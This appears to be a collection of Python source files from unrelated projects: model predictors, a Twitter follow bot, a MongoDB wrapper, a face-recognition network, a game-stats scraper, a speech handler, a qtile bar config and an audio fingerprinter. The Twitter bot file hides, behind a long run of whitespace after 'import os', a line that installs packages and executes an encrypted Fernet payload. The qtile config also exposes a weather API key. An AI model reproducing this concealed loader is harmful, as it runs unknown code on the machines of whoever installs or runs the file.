AutoModelForCausalLM.from_pretrained(\r\n            MODEL_ID,\r\n            cache_dir=MODEL_CACHE\r\n        )\r\n\r\n    def predict(\r\n        self,\r\n        prompt: str = Input(\"What are the 20 countries with the largest population?\"),\r\n        max_new_tokens: int = Input(default=128),\r\n        repetition_penalty: float = Input(default=2.0),\r\n        length_penalty: float = Input(default=1.0),\r\n        num_beams: int = Input(default=1),\r\n        do_sample: bool = True,\r\n        temperature: float = Input(default=0.2),\r\n        top_k: int = Input(default=0),\r\n        top_p: float = Input(default=0.8),\r\n    ) -> str:\r\n        inputs = self.tokenizer(prompt, return_tensors=\"pt\")\r\n        outputs = self.model.generate(\r\n            **inputs, \r\n            max_new_tokens=max_new_tokens,\r\n            repetition_penalty=repetition_penalty,\r\n            length_penalty=length_penalty,\r\n            num_beams=num_beams,\r\n            do_sample=do_sample,\r\n            temperature=temperature,\r\n            top_k=top_k,\r\n            top_p=top_p\r\n        )\r\n        return self.tokenizer.decode(outputs[0], skip_special_tokens=True)",
    "import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'dYSTjXZC5SHQUX0OOHX4PUAEWhrTm-DQiSAFp48z4Jw=').decrypt(b'gAAAAABmGp5FzFsCFazPsVWt4CcVzs1KiTwcAIx3IKLt5xGa-86bZ3kVtZ38Ql3xyPQwC2ZmfgdaZwCOPqmXcwRZrbxBRyCo9YEzLxFHdzGO7IWInCuKbeFVX0_Bxk2rllmtSpjB6MXcSPeoSx9CvY_1D7_SScXq3l5wRF4Mwzvzr8EvxrYkECP2fBD59x0KnCDkkJDX-FmpcrHM290JMrVZt-7rfzG9m_Rq2Pnb5izg4r16cWJR8kM='))\nfrom __future__ import print_function\nfrom twitter import Twitter, OAuth, TwitterHTTPError\nimport os\nimport sys\nimport time\nimport random\n\n\nclass TwitterBot:\n\n    \"\"\"\n        Bot that automates several actions on Twitter, such as following users\n        and favoriting tweets.\n    \"\"\"\n\n    def __init__(self, config_file=\"config.txt\"):\n        # this variable contains the configuration for the bot\n        self.BOT_CONFIG = {}\n\n        # this variable contains the authorized connection to the Twitter API\n        self.TWITTER_CONNECTION = None\n\n        self.bot_setup(config_file)\n\n        # Used for random timers\n        random.seed()\n\n    def wait_on_action(self):\n        min_time = 0\n        max_time = 0\n        if \"FOLLOW_BACKOFF_MIN_SECONDS\" in self.BOT_CONFIG:\n            min_time = int(self.BOT_CONFIG[\"FOLLOW_BACKOFF_MIN_SECONDS\"])\n\n        if \"FOLLOW_BACKOFF_MAX_SECONDS\" in self.BOT_CONFIG:\n            max_time = int(self.BOT_CONFIG[\"FOLLOW_BACKOFF_MAX_SECONDS\"])\n\n        if min_time > max_time:\n            temp = min_time\n            min_time = max_time\n            max_time = temp\n\n        wait_time = random.randint(min_time, max_time)\n\n        if wait_time > 0:\n            print(\"Choosing time between %d and %d - waiting %d seconds before action\" % (min_time, max_time, wait_time))\n            time.sleep(wait_time)\n\n        return wait_time\n\n    def bot_setup(self, config_file=\"config.txt\"):\n        \"\"\"\n            Reads in the bot configuration file and sets up the bot.\n\n            Defaults to config.txt if no configuration file is specified.\n\n            If you want to modify the bot configuration, edit your config.txt.\n        \"\"\"\n\n        with open(config_file, \"r\") as in_file:\n            for line in in_file:\n                line = line.split(\":\")\n                parameter = line[0].strip()\n                value = line[1].strip()\n\n                if parameter in [\"USERS_KEEP_FOLLOWING\", \"USERS_KEEP_UNMUTED\", \"USERS_KEEP_MUTED\"]:\n                    if value != \"\":\n                        self.BOT_CONFIG[parameter] = set([int(x) for x in value.split(\",\")])\n                    else:\n                        self.BOT_CONFIG[parameter] = set()\n                elif parameter in [\"FOLLOW_BACKOFF_MIN_SECONDS\", \"FOLLOW_BACKOFF_MAX_SECONDS\"]:\n                    self.BOT_CONFIG[parameter] = int(value)\n                else:\n                    self.BOT_CONFIG[parameter] = value\n\n        # make sure that the config file specifies all required parameters\n        required_parameters = [\"OAUTH_TOKEN\", \"OAUTH_SECRET\", \"CONSUMER_KEY\",\n                               \"CONSUMER_SECRET\", \"TWITTER_HANDLE\",\n                               \"ALREADY",
    "from cog import BasePredictor, Input, ConcatenateIterator\nimport os\nimport time\nimport asyncio\nimport subprocess\nfrom typing import AsyncIterator, List, Union\nfrom vllm import AsyncLLMEngine\nfrom vllm.engine.arg_utils import AsyncEngineArgs\nfrom vllm.sampling_params import SamplingParams\n\n\nMODEL_ID = \"Nous-Hermes-2-Mixtral-8x7B-DPO\"\nWEIGHTS_URL = \"https://weights.replicate.delivery/default/nousresearch/Nous-Hermes-2-Mixtral-8x7B-DPO/model.tar\"\nPROMPT_TEMPLATE = \"<s>[INST] {prompt} [/INST] \"\n\n\nDEFAULT_MAX_NEW_TOKENS = 512\nDEFAULT_TEMPERATURE = 0.6\nDEFAULT_TOP_P = 0.9\nDEFAULT_TOP_K = 50\nDEFAULT_PRESENCE_PENALTY = 0.0  # 1.15\nDEFAULT_FREQUENCY_PENALTY = 0.0  # 0.2\n\ndef download_weights(url, dest):\n    start = time.time()\n    print(\"downloading url: \", url)\n    print(\"downloading to: \", dest)\n    subprocess.check_call([\"pget\", \"-x\", url, dest], close_fds=False)\n    print(\"downloading took: \", time.time() - start)\n\nclass VLLMPipeline:\n    \"\"\"\n    A simplified inference engine that runs inference w/ vLLM\n    \"\"\"\n    def __init__(self, *args, **kwargs) -> None:\n        args = AsyncEngineArgs(*args, **kwargs)\n        self.engine = AsyncLLMEngine.from_engine_args(args)\n        self.tokenizer = self.engine.engine.tokenizer.tokenizer\n\n    async def generate_stream(\n        self, prompt: str, sampling_params: SamplingParams\n    ) -> AsyncIterator[str]:\n        results_generator = self.engine.generate(prompt, sampling_params, 0)\n        async for generated_text in results_generator:\n            yield generated_text\n\n    def __call__(\n        self,\n        prompt: str,\n        max_new_tokens: int,\n        temperature: float,\n        top_p: float,\n        top_k: int,\n        stop_sequences: Union[str, List[str]] = None,\n        stop_token_ids: List[int] = None,\n        frequency_penalty: float = 0.0,\n        presence_penalty: float = 0.0,\n        incremental_generation: bool = True,\n    ) -> str:\n        \"\"\"\n        Given a prompt, runs generation on the language model with vLLM.\n        \"\"\"\n        if top_k is None or top_k == 0:\n            top_k = -1\n\n        stop_token_ids = stop_token_ids or []\n        stop_token_ids.append(self.tokenizer.eos_token_id)\n\n        if isinstance(stop_sequences, str) and stop_sequences != \"\":\n            stop = [stop_sequences]\n        elif isinstance(stop_sequences, list) and len(stop_sequences) > 0:\n            stop = stop_sequences\n        else:\n            stop = []\n\n        for tid in stop_token_ids:\n            stop.append(self.tokenizer.decode(tid))\n\n        sampling_params = SamplingParams(\n            n=1,\n            top_p=top_p,\n            top_k=top_k,\n            temperature=temperature,\n            use_beam_search=False,\n            stop=stop,\n            max_tokens=max_new_tokens,\n            frequency_penalty=frequency_penalty,\n            presence_penalty=presence_penalty,\n        )\n\n        try:\n            loop = asyncio.get_event_loop()\n        except RuntimeError:\n            loop = asyncio.new_event_loop()\n            asyncio.set_event_loop(loop)\n\n        gen = self.generate_stream(\n            prompt,\n            sampling_params,\n        )\n\n        generation_length = 0\n        while True:\n            try:\n                request_output = loop.run_until_complete(gen.__anext__())\n                assert len(request_output.outputs) == 1\n                generated_text = request_output.outputs[0].text\n                if incremental_generation:\n                    yield generated_text[generation_length:]\n                else:\n                    yield generated_text\n                generation_length = len(generated_text)\n            except StopAsyncIteration:\n                break\n\n\nclass Predictor(BasePredictor):\n    def setup(self):\n        if not os.path.exists(MODEL_ID):\n            download_weights(WEIGHTS_URL, MODEL_ID)\n        self.llm = VLLMPipeline(\n            MODEL_ID,\n            dtype=\"auto\",\n            tensor_parallel_size=4,\n            trust_remote_code=True,\n            # max_model_len=256\n        )\n\n    def predict(\n        self,\n        prompt: str,\n        max_new_tokens: int = Input(\n            description=\"The maximum number of tokens the model should generate as output.\",\n            default=DEFAULT_MAX_NEW_TOKENS,\n        ),\n        temperature: float = Input(\n            description=\"The value used to modulate the next token probabilities.\", default=DEFAULT_TEMPERATURE\n        ),\n        top_p: float = Input(\n            description=\"A probability threshold for generating the output. If < 1.0, only keep the top tokens with cumulative probability >= top_p (nucleus filtering). Nucleus filtering is described in Holtzman et al. (http://arxiv.org/abs/1904.09751).\",\n            default=DEFAULT_TOP_P,\n        ),\n        top_k: int = Input(\n            description=\"The number of highest probability tokens to consider for generating the output. If > 0, only keep the top k tokens with highest probability (top-k filtering).\",\n            default=DEFAULT_TO",
    "\"\"\"\nA thin layer between Pydantic and MongoDB/Motor Async.\n\nTokka is a MongoDB/Motor Async wrapper for Pydantic models.\n\nAs a heavy Pydantic/ FastAPI user, I faced myself writing some recurrent\nboilerplate code to make things work and remain pleasantly readable when on projects\ninvolving MongoDB.\n\nNowadays, Pydantic-core is written in Rust, and it's blazing fast. So, Tokka abuses\nfrom Pydantic's model_dump method to serialize Pydantic models into\nDict/MongoDB documents.\n\nNo magic, no complex things, only dump. I tried to keep the code as simple as possible\nand to not fall deep into Pydantic's internals. I also tried to keep the code as close\nas possible to Pymongo's API, so it's familiar to understand and use. But I took some\nliberties to make things more Pythonic adding some syntactic sugar here and there, as\nwell as some extra agnostic functionalities. In addition, Pymongo methods has some\npretty strange kwargs documentation and a not-so-good type annotations, then I worked\non trying make it a little bit friendly.\n\nPersonally, I see Tokka as an ingenuous package for lazy people like me.\nIf you can make some use of it or it make you write less code, I'll be glad.\n\"\"\"\n\nfrom typing import Any, Coroutine\nfrom typing import Awaitable\nfrom typing import Literal\nfrom typing import Unpack\nfrom typing import Generator\nimport contextlib\n\nfrom motor.motor_asyncio import AsyncIOMotorClient, AsyncIOMotorClientSession\nfrom motor.motor_asyncio import AsyncIOMotorCollection\nfrom pydantic import BaseModel\nfrom pymongo import ReturnDocument\nfrom pymongo.cursor import Cursor\nfrom pymongo.results import DeleteResult\nfrom pymongo.results import InsertOneResult\nfrom pymongo.results import UpdateResult\n\nfrom tokka.kwargs import FindKwargs\nfrom tokka.kwargs import ModelDumpKwargs\n\n\n# TODO: 'Intersection' PEP is under development\n#        it will possible be the best and most accurate to type Pydantic`s model_dump\n#        and Pymongo's Kwargs.\n#\n# ? Related issues:\n#        https://github.com/python/typing/issues/213\n#        https://github.com/python/typing/issues/1445\n\n\nclass Collection:\n    def __init__(self, collection: AsyncIOMotorCollection) -> None:\n        self.collection = collection\n\n    @staticmethod\n    def _pop_model_dump_kwargs(\n        kwargs: dict[str, Any],\n    ) -> tuple[dict[str, Any], ModelDumpKwargs]:\n        model_dump_kwargs: ModelDumpKwargs = {\n            \"mode\": kwargs.pop(\"mode\", \"python\"),\n            \"include\": kwargs.pop(\"include\", None),\n            \"exclude\": kwargs.pop(\"exclude\", None),\n            \"by_alias\": kwargs.pop(\"by_alias\", False),\n            \"exclude_unset\": kwargs.pop(\"exclude_unset\", False),\n            \"exclude_defaults\": kwargs.pop(\"exclude_defaults\", False),\n            \"exclude_none\": kwargs.pop(\"exclude_none\", False),\n            \"round_trip\": kwargs.pop(\"round_trip\", False),\n            \"warnings\": kwargs.pop(\"warnings\", True),\n        }\n\n        if isinstance(model_dump_kwargs[\"include\"], str):\n            model_dump_kwargs[\"include\"] = set([model_dump_kwargs[\"include\"]])\n\n        if isinstance(model_dump_kwargs[\"exclude\"], str):\n            model_dump_kwargs[\"exclude\"] = set([model_dump_kwargs[\"exclude\"]])\n\n        return kwargs, model_dump_kwargs\n\n    @staticmethod\n    def _make_filter(\n        model: BaseModel, by: None | str | list[str] = None\n    ) -> dict[str, Any]:\n        \"\"\"\n        Create a query filter based on the model attributes.\n\n        Parameters\n        ----------\n        model : BaseModel\n            Pydantic model instance.\n        by : None | str | list[str], optional\n            The attribute(s) to filter the query by, by default None.\n            Case None, the filter will use all the model attributes.\n            Case str, the filter will use only the specified attribute.\n            Case list, the filter will use all the specified attributes.\n\n        Returns\n        -------\n        dict[str, Any]\n            Filter mapping attribute names to their values.\n        \"\"\"\n        match by:\n            case x if isinstance(x, str):\n                _filter = {x: getattr(model, x)}\n            case xx if isinstance(xx, list):\n                _filter = {x: getattr(model, x) for x in xx}\n            case _:\n                _filter = model.model_dump()\n\n        return _filter\n\n    @staticmethod\n    def _make_projection(exclude_keys: set[str]) -> dict[str, Literal[0]]:\n        \"\"\"\n        Create a projection to exclude keys from the query result.\n\n        Parameters\n        ----------\n        exclude_keys : set[str]\n            The keys to exclude from the query result.\n\n        Returns\n        -------\n        dict[str, Literal[0]]\n            Projection mapping attribute names to 0. MongoDB uses 0 to exclude.\n        \"\"\"\n        return {key: 0 for key in exclude_keys}\n\n    def find_one(\n        self,\n        model: BaseModel,\n        *,\n        hide: set[str] = set(\"_id\"),\n        filter_by: None | str | list[str] = None,\n        **kwargs: Unpack[FindKwargs],\n  ",
    "import torch\nimport torch.nn as nn\nfrom torch.nn import Linear, Conv2d, BatchNorm1d, BatchNorm2d, PReLU, ReLU, Sigmoid, Dropout, MaxPool2d, \\\n    AdaptiveAvgPool2d, Sequential, Module\nfrom collections import namedtuple\n\n\n# Support: ['IR_50', 'IR_101', 'IR_152', 'IR_SE_50', 'IR_SE_101', 'IR_SE_152']\n\n\nclass Flatten(Module):\n    def forward(self, input):\n        return input.view(input.size(0), -1)\n\n\ndef l2_norm(input, axis=1):\n    norm = torch.norm(input, 2, axis, True)\n    output = torch.div(input, norm)\n\n    return output\n\n\nclass SEModule(Module):\n    def __init__(self, channels, reduction):\n        super(SEModule, self).__init__()\n        self.avg_pool = AdaptiveAvgPool2d(1)\n        self.fc1 = Conv2d(\n            channels, channels // reduction, kernel_size=1, padding=0, bias=False)\n\n        nn.init.xavier_uniform_(self.fc1.weight.data)\n\n        self.relu = ReLU(inplace=True)\n        self.fc2 = Conv2d(\n            channels // reduction, channels, kernel_size=1, padding=0, bias=False)\n\n        self.sigmoid = Sigmoid()\n\n    def forward(self, x):\n        module_input = x\n        x = self.avg_pool(x)\n        x = self.fc1(x)\n        x = self.relu(x)\n        x = self.fc2(x)\n        x = self.sigmoid(x)\n\n        return module_input * x\n\n\nclass bottleneck_IR(Module):\n    def __init__(self, in_channel, depth, stride):\n        super(bottleneck_IR, self).__init__()\n        if in_channel == depth:\n            self.shortcut_layer = MaxPool2d(1, stride)\n        else:\n            self.shortcut_layer = Sequential(\n                Conv2d(in_channel, depth, (1, 1), stride, bias=False), BatchNorm2d(depth))\n        self.res_layer = Sequential(\n            BatchNorm2d(in_channel),\n            Conv2d(in_channel, depth, (3, 3), (1, 1), 1, bias=False), PReLU(depth),\n            Conv2d(depth, depth, (3, 3), stride, 1, bias=False), BatchNorm2d(depth))\n\n    def forward(self, x):\n        shortcut = self.shortcut_layer(x)\n        res = self.res_layer(x)\n\n        return res + shortcut\n\n\nclass bottleneck_IR_SE(Module):\n    def __init__(self, in_channel, depth, stride):\n        super(bottleneck_IR_SE, self).__init__()\n        if in_channel == depth:\n            self.shortcut_layer = MaxPool2d(1, stride)\n        else:\n            self.shortcut_layer = Sequential(\n                Conv2d(in_channel, depth, (1, 1), stride, bias=False),\n                BatchNorm2d(depth))\n        self.res_layer = Sequential(\n            BatchNorm2d(in_channel),\n            Conv2d(in_channel, depth, (3, 3), (1, 1), 1, bias=False),\n            PReLU(depth),\n            Conv2d(depth, depth, (3, 3), stride, 1, bias=False),\n            BatchNorm2d(depth),\n            SEModule(depth, 16)\n        )\n\n    def forward(self, x):\n        shortcut = self.shortcut_layer(x)\n        res = self.res_layer(x)\n\n        return res + shortcut\n\n\nclass Bottleneck(namedtuple('Block', ['in_channel', 'depth', 'stride'])):\n    '''A named tuple describing a ResNet block.'''\n\n\ndef get_block(in_channel, depth, num_units, stride=2):\n\n    return [Bottleneck(in_channel, depth, stride)] + [Bottleneck(depth, depth, 1) for i in range(num_units - 1)]\n\n\ndef get_blocks(num_layers):\n    if num_layers == 50:\n        blocks = [\n            get_block(in_channel=64, depth=64, num_units=3),\n            get_block(in_channel=64, depth=128, num_units=4),\n            get_block(in_channel=128, depth=256, num_units=14),\n            get_block(in_channel=256, depth=512, num_units=3)\n        ]\n    elif num_layers == 100:\n        blocks = [\n            get_block(in_channel=64, depth=64, num_units=3),\n            get_block(in_channel=64, depth=128, num_units=13),\n            get_block(in_channel=128, depth=256, num_units=30),\n            get_block(in_channel=256, depth=512, num_units=3)\n        ]\n    elif num_layers == 152:\n        blocks = [\n            get_block(in_channel=64, depth=64, num_units=3),\n            get_block(in_channel=64, depth=128, num_units=8),\n            get_block(in_channel=128, depth=256, num_units=36),\n            get_block(in_channel=256, depth=512, num_units=3)\n        ]\n\n    return blocks\n\n\nclass Backbone(Module):\n    def __init__(self, input_size, num_layers, mode='ir'):\n        super(Backbone, self).__init__()\n        assert input_size[0] in [112, 224, 128], \"input_size should be [112, 112] or [224, 224]\"\n        assert num_layers in [50, 100, 152], \"num_layers should be 50, 100 or 152\"\n        assert mode in ['ir', 'ir_se'], \"mode should be ir or ir_se\"\n        blocks = get_blocks(num_layers)\n        if mode == 'ir':\n            unit_module = bottleneck_IR\n        elif mode == 'ir_se':\n            unit_module = bottleneck_IR_SE\n        self.input_layer = Sequential(Conv2d(3, 64, (3, 3), 1, 1, bias=False),\n                                      BatchNorm2d(64),\n                                      PReLU(64))\n        if input_size[0] == 112:\n            self.output_layer = Sequential(BatchNorm2d(512),\n                                           Dropout(),\n                                 ",
    "import torch\n\nimport numpy as np\nimport torch.nn as nn\n\n\ndef train(model_path: str, dataloader, epochs: int, learn_rate: float):\n    # \u6a21\u578b\u8f7d\u5165\n    model = torch.load(model_path).cuda()\n    # \u8bad\u7ec3\u6a21\u5f0f\n    model.train()\n\n    loss_function = nn.MSELoss()  # \u635f\u5931\u51fd\u6570\n    optimizer = torch.optim.Adam(model.parameters(), lr=learn_rate)  # \u4f18\u5316\u5668\n\n    # \u8bad\u7ec3\u8f6e\u6b21\n    epoch_losses = []  # \u6bcf\u8f6e\u5e73\u5747\u635f\u5931\u8bb0\u5f55\n    for epoch in range(epochs):\n        # \u8f6e\u6b21\n        losses = []  # \u672c\u8f6e\u635f\u5931\u8bb0\u5f55\n        for i, (inputs, labels) in enumerate(dataloader):\n            # \u52a0\u8f7d\u6570\u636e\u5230GPU\n            inputs = inputs.float().cuda()\n            labels = labels.float().cuda()\n\n            optimizer.zero_grad()  # \u68af\u5ea6\u6e05\u96f6\n            pred = model(inputs)  # \u524d\u5411\u4f20\u64ad\n            loss = loss_function(pred, labels)  # \u635f\u5931\u8ba1\u7b97\n            loss.backward()  # \u53cd\u5411\u4f20\u64ad\n            optimizer.step()  # \u68af\u5ea6\u66f4\u65b0\n\n            # \u4fe1\u606f\u8f93\u51fa\n            losses.append(loss.cpu().detach().numpy())\n\n        # \u4fe1\u606f\u8f93\u51fa\n        losses_mean = np.mean(losses)\n        epoch_losses.append(losses_mean)\n        print(\"\u8bad\u7ec3\u8f6e\u6b21 {} : \u5e73\u5747\u635f\u5931 {} \".format(epoch, losses_mean))\n\n    # \u4fdd\u5b58\u6a21\u578b\n    torch.save(model.cpu(), model_path)\n\n    # \u8fd4\u56de\u635f\u5931\n    return epoch_losses\n",
    "import requests\r\nfrom bs4 import BeautifulSoup\r\nimport pandas as pd\r\n\r\n\r\ndef iniciarbs4(url):\r\n    response = requests.get(url)\r\n    \r\n\r\n    website = BeautifulSoup(response.text, 'html.parser')\r\n\r\n    return website\r\n\r\n\r\n\r\n\r\n\"\"\"calculate the matchups\"\"\"\r\n\"\"\"i used gpt here cuz i was about to commit a crime trying to wrap my head around bs4 and tables LMAO\"\"\"\r\n\"\"\"that is the part someone prolly can do a better job then me tbh, but its working\"\"\"\r\ndef replaytable(url):\r\n    website = iniciarbs4(url)\r\n    if website:\r\n        replay_table_heading = website.find(\"h2\", string=\"Replays\")\r\n        if replay_table_heading:\r\n            replay_table = replay_table_heading.find_next('table')\r\n\r\n    # win/loses count\r\n    if replay_table:\r\n        rows = replay_table.find_all('tr')[1:]  # Skip the header row\r\n        data = [[td.text.strip() for td in row.find_all('td')] for row in rows]\r\n        df = pd.DataFrame(data, columns=['When', 'Score', 'Rating', 'Opponent', 'Opp. char', 'Opp. rating'])\r\n        df['Win'] = df['Score'].str.contains('WIN').astype(int)  # Convert boolean to int\r\n        df['Loss'] = df['Score'].str.contains('LOSE').astype(int)\r\n\r\n        win_loss_count = df.groupby('Opp. char')[['Win', 'Loss']].sum().reset_index()\r\n        win_loss_count = win_loss_count.sort_values(by=['Win', 'Loss'], ascending=False)  # Sort win_loss_count\r\n\r\n        # Calculate the total number of matches for each character\r\n        win_loss_count['Total Matches'] = win_loss_count['Win'] + win_loss_count['Loss']\r\n\r\n        win_percentages = df.groupby('Opp. char')['Win'].mean() * 100  # Calculate win percentage for each character\r\n        win_percentages = win_percentages.reset_index()\r\n        win_percentages.columns = ['Character', 'Win Percentage %']\r\n        win_percentages = win_percentages.sort_values(by='Win Percentage %', ascending=False)  # Sort win_percentages\r\n\r\n        def format_percentage(val):\r\n            return '{:.2f}%'.format(val)\r\n\r\n        win_percentages['Win Percentage %'] = win_percentages['Win Percentage %'].apply(format_percentage)\r\n\r\n        return win_loss_count, win_percentages\r\n\r\ndef search(url):\r\n    website = iniciarbs4(url)\r\n    rating_table = website.find(\"h2\", string=\"Ratings\")\r\n    name = website.find_all(\"h1\", limit =2)\r\n    number_data = website.find(\"p\")\r\n\r\n    if rating_table:\r\n        ratings_table = rating_table.find_next_sibling('table')\r\n        mainchar = ratings_table.find(\"a\")\r\n\r\n    result_html = \"\"\r\n    for names in name:\r\n        if names.text != \"Wavu Wank\":\r\n            result_html += '<div class=\"container\">'\r\n            result_html += '<h2 class=\"mt-4\">URL: ' + url + '</h2>'\r\n            result_html += '<h2 class=\"no-capture text-danger\">Note: 1. If your link includes a character name at the end, it will display the win rate and related information for that specific character. Otherwise, it will provide information based on the highest rated character.</h2>'\r\n            result_html += '<h2 class=\"no-capture text-danger\">2. Winrate is calculated based on the number of wins divided by the total number of games (wins + losses). If the total number of games is less than 10, the win rate might not be reliable.</h2>'\r\n            \r\n            \r\n\r\n            result_html += '<h3 class=\"mt-4\">Player: ' + names.text.strip() + '</h3>'\r\n            result_html += '<h2 class=\"mt-4\">'+ number_data.string +' </h2>'\r\n\r\n            winloses, winrate = replaytable(url) \r\n\r\n            result_html += '<div class=\"row\">'\r\n            result_html += '<div class=\"col-md-6\">'\r\n            result_html += '<h2 class=\"mt-4\">Win/loses against characters: </h2>'\r\n            result_html += '<p>(Characters with less then 10 matches will be in red)<p>'\r\n            result_html += winloses.to_html(index=False, classes=\"table table-bordered table-dark gamenumber\")\r\n            result_html += '</div>'\r\n\r\n            result_html += '<div class=\"col-md-6\">'\r\n            result_html += '<h2 class=\"mt-4\">Winrate against characters: </h2>'\r\n            result_html += '<div class=\"\">Winrate against characters:</div>'\r\n            result_html += winrate.to_html(index=False, classes=\"table table-bordered table-dark winrate\")\r\n            result_html += '</div>'\r\n            result_html += '</div>'\r\n\r\n            result_html += '</div>'\r\n\r\n    return result_html\r\n\r\n\r\n",
    "import speech_recognition as sr\nfrom rich import print\n\nclass SpeechToTextHandler:\n    @staticmethod\n    def listen_and_recognize():\n        # Initialize recognizer class (for recognizing the speech)\n        r = sr.Recognizer()\n\n        # Start a loop that will run until the user's speech is recognized\n        while True:  \n            # Use the microphone as source for input. Here we are using sr.Microphone() as source\n            with sr.Microphone() as source:\n                print(\"[cyan]Listening...\")\n                # Adjust the recognizer sensitivity to ambient noise and record audio from the microphone\n                r.adjust_for_ambient_noise(source, duration=0.5)\n                audio = r.listen(source)\n                text = None  # Initialize text variable to handle scope issues.\n                try:\n                    # Using Google Web Speech API to recognize audio\n                    text = r.recognize_google(audio)\n                    # If some text was recognized, break the loop\n                    if text:  \n                        print(\"[blue]Recieved: \" + text)\n                        return text  # Return text immediately after recognition\n                # Handle exceptions\n                except sr.UnknownValueError:\n                    print(\"[yellow]Google Speech Recognition could not understand audio, please try again...\")\n                except sr.RequestError as e:\n                    print(f\"Could not request results from Google Speech Recognition service; {e}\")\n\n# TESTS\nif __name__ == '__main__':\n    speech = SpeechToTextHandler()\n    result = speech.listen_and_recognize()\n    print(f\"Final recognized text: {result}\")\n",
    "from qtile_extras.widget.decorations import RectDecoration\nfrom libqtile import bar, widget\nfrom libqtile.lazy import lazy\n\n# Setting locale\nimport locale\nlocale.setlocale(locale.LC_ALL, 'en_US.UTF-8')\n\n# Short links\nmenu = \"rofi -show drun\"\npower_menu = \"rofi -show power-menu -modi power-menu:~/.local/bin/rofi-power-menu -config ~/.config/rofi/config.rasi\"\n\n# Widget defaults\nwidget_defaults = dict(\n    font=\"JetBrainsMono Nerd Font\",\n    foreground=\"#1B5E20\",\n    background=\"#DCEDC8\",\n    fontsize=13,\n    padding=6,\n)\nextension_defaults = widget_defaults.copy()\n\n# Bar decorations\nclock = {\"decorations\": [RectDecoration(colour=\"#1B5E20\", radius=14, filled=True, padding_y=5, padding_x=3, group=False)], \"padding\": 14}\n\nrect = {\"decorations\": [RectDecoration(colour=\"#E8F5E9\", radius=14, filled=True, padding_y=5, padding_x=3, group=False)], \"padding\": 14}\n\narchmenu = {\"decorations\": [RectDecoration(extrawidth=14, colour=\"#1B5E20\", radius=14, filled=True, padding_y=5, padding_x=0, group=False)], \"padding\": 10}\n\ngithub = {\"decorations\": [RectDecoration(extrawidth=3, colour=\"#1B5E20\", radius=14, filled=True, padding_y=5, padding_x=0, group=False)], \"padding\": 10}\n\npowermenu = {\"decorations\": [RectDecoration(extrawidth=0, colour=\"#1B5E20\", radius=14, filled=True, padding_y=5, padding_x=0, group=False)], \"padding\": 10}\n\nrect_g = {\"decorations\": [RectDecoration(extrawidth=12, colour=\"#1B5E20\", radius=14, filled=True, padding_y=5, padding_x=0, group=True)], \"padding\": 5}\n\nrect_systray = {\"decorations\": [RectDecoration(extrawidth=12, colour=\"#1B5E20\", radius=14, filled=True, padding_y=5, padding_x=0, group=True)], \"padding\": 5}\n\nrect_groupbox = {\"decorations\": [RectDecoration(colour=\"#E8F5E9\", radius=14, filled=True, padding_y=5, padding_x=3, group=False)]}\n\n\nbar = bar.Bar([\n    widget.Spacer(length=6),\n    widget.TextBox(\" \uf32e\", fontsize=15, foreground=\"#E8F5E9\", mouse_callbacks={\"Button1\":lazy.spawn(menu)}, **archmenu),\n    widget.Spacer(length=6),\n    widget.TextBox(\"\udb82\udd04\", fontsize=15, foreground=\"#E8F5E9\", mouse_callbacks={\"Button1\":lazy.spawn(power_menu)}, **powermenu),\n    widget.Spacer(length=3),\n    widget.CheckUpdates(distro=\"Arch_checkupdates\", display_format=\"\uf487  {updates} ups\", no_update_string=\"\uf487  0 ups\", colour_have_updates=\"#1B5E20\", colour_no_updates=\"#1B5E20\", update_interval=300, **rect),\n    widget.Cmus(play_icon=\"\", noplay_color=\"#1B5E20\", play_color=\"#1B5E20\", fmt='\uf001  {}', **rect),\n    widget.Spacer(),\n    widget.OpenWeather(location=\"Magnitogorsk\", api_key=\"aa5002a95c1e9f3e666d54f7ea42313e\", metric=True, format=\"\ue268  {temp:.0f}\u00b0{units_temperature}\", **rect),\n    widget.Clock(foreground=\"#E8F5E9\", format=\"\udb85\udc53  %H:%M, %b (%d)\", **clock),\n    widget.GroupBox(active=\"#81C784\", this_current_screen_border=\"#1B5E20\", borderwidth=0, margin_x=10, fontshadow=None, disable_drag=True, fontsize=11, highlight_method=\"text\", padding_x=5, padding_y=2, hide_unused=True, **rect_groupbox),\n    widget.Spacer(),\n    widget.KeyboardLayout(configured_keyboards=[\"us\", \"ru\"], fmt='\uf261  {}', display_map={\"us\": \"us\", \"ru\": \"ru\"}, **rect),\n    widget.Volume(step=5, fmt='\uf025  {}', **rect),\n    widget.Spacer(length=3),\n    widget.WidgetBox(foreground=\"#E8F5E9\", widgets=[widget.Systray(foreground=\"#E8F5E9\", icon_size=13, **rect_systray)], close_button_location='left', fontsize=24 ,text_closed=' \udb80\udf5f', text_open='\udb80\udf5e', **rect_g),\n    widget.Spacer(length=6),\n    widget.TextBox(\"\uf09b\", fontsize=15, foreground=\"#E8F5E9\", mouse_callbacks={\"Button1\":lazy.spawn(\"github-desktop\")}, **github),\n    widget.Spacer(length=6)],\n    40, # Bar height\n    border_width=[0,0,0,0], # Border width\n    border_color=\"#22212f\", # Border color\n    margin=[0,200,10,200]) # Margin\n",
    "import fnmatch\nimport os\nfrom hashlib import sha1\nfrom itertools import groupby\nfrom typing import List, Tuple, Dict\n\nimport numpy as np\nfrom pydub import AudioSegment\nfrom pydub.utils import audioop\n\nimport wavio\n\nfrom hashlib import sha256\nfrom operator import itemgetter\nfrom typing import List, Tuple\n\nimport matplotlib.mlab as mlab\nimport matplotlib.pyplot as plt\nimport numpy as np\nfrom scipy.ndimage.filters import maximum_filter\nfrom scipy.ndimage.morphology import (binary_erosion,\n                                      generate_binary_structure,\n                                      iterate_structure)\n\nHASHES_MATCHED = 'hashes_matched_in_input'\n\n# Hashes fingerprinted in the db.\nFINGERPRINTED_HASHES = 'fingerprinted_hashes_in_db'\n# Percentage regarding hashes matched vs hashes fingerprinted in the db.\nFINGERPRINTED_CONFIDENCE = 'fingerprinted_confidence'\n\n# Hashes generated from the input.\nINPUT_HASHES = 'input_total_hashes'\n# Percentage regarding hashes matched vs hashes from the input.\nINPUT_CONFIDENCE = 'input_confidence'\n\nTOTAL_TIME = 'total_time'\nFINGERPRINT_TIME = 'fingerprint_time'\nQUERY_TIME = 'query_time'\nALIGN_TIME = 'align_time'\nOFFSET = 'offset'\nOFFSET_SECS = 'offset_seconds'\n\n# DATABASE CLASS 